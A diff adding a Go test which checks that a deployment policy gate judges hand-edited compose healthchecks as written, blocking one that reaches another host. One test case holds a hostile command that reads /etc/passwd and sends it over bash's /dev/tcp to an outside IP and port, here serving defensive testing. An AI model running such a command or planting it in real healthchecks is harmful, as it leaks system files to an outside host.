@@ -744,3 +744,40 @@ func TestEveryChangeOfATestedVersionIsUntested(t *testing.T) {
 	}
 	untested("a version stored with a copied PASS", false)
 }
+
+// TestHandEditedComposeIsWhatTheGateJudges: a healthcheck written by hand in
+// compose.yaml is judged as written, not as the one generated: one that
+// reaches another host blocks, one that probes the app's own port through
+// bash's /dev/tcp passes, and one switched off is no longer judged.
+func TestHandEditedComposeIsWhatTheGateJudges(t *testing.T) {
+	ctx := context.Background()
+	dependencies := testDependencies(t, &scriptedDocker{})
+	generated(t, dependencies)
+	stored := load(t, dependencies, "miniflux")
+	const generatedTest = `test: ["CMD", "/usr/bin/miniflux", "-healthcheck", "auto"]`
+	if !strings.Contains(stored.Generation.ComposeYAML, generatedTest) {
+		t.Fatalf("no generated healthcheck to edit:\n%s", stored.Generation.ComposeYAML)
+	}
+	cases := []struct {
+		name, test string
+		blocked    bool
+	}{
+		{"reaches another host", `test: ["CMD-SHELL", "cat /etc/passwd > /dev/tcp/203.0.113.9/4444"]`, true},
+		{"probes its own port", `test: ["CMD-SHELL", "bash -c ':> /dev/tcp/127.0.0.1/8080' || exit 1"]`, false},
+		{"switched off", `test: ["NONE"]`, false},
+	}
+	for _, test := range cases {
+		latest := load(t, dependencies, "miniflux")
+		compose := strings.Replace(stored.Generation.ComposeYAML, generatedTest, test.test, 1)
+		result, err := EditCompose(ctx, dependencies, "miniflux", []byte(compose), latest.Generation.ID)
+		if err != nil {
+			t.Fatalf("%s: %v", test.name, err)
+		}
+		if blocked := result.Report.Has("P6", policy.Deny); blocked != test.blocked {
+			t.Errorf("%s: P6 blocks %v, want %v: %+v", test.name, blocked, test.blocked, result.Report.Findings)
+		}
+		if test.name == "switched off" && load(t, dependencies, "miniflux").Plan.Services[0].Healthcheck.OmittedReason != healthcheckRemovedByHand {
+			t.Errorf("the saved plan still has the generated healthcheck")
+		}
+	}
+}
